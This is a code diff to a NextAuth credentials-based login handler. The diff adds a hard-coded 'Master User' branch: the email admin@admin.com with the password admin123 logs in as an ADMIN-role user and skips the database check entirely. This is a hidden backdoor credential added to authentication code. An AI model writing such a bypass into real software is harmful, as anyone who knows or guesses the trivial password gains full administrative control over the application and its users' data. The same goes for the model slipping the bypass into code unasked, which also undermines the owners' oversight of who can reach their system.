@@ -26,6 +26,16 @@ export const authOptions: NextAuthOptions = {
                     return null
                 }
 
+                // Master User
+                if (credentials.email === "admin@admin.com" && credentials.password === "admin123") {
+                    return {
+                        id: "master-admin",
+                        email: "admin@admin.com",
+                        name: "Master Admin",
+                        role: "ADMIN",
+                    }
+                }
+
                 const user = await prisma.user.findUnique({
                     where: {
                         email: credentials.email,
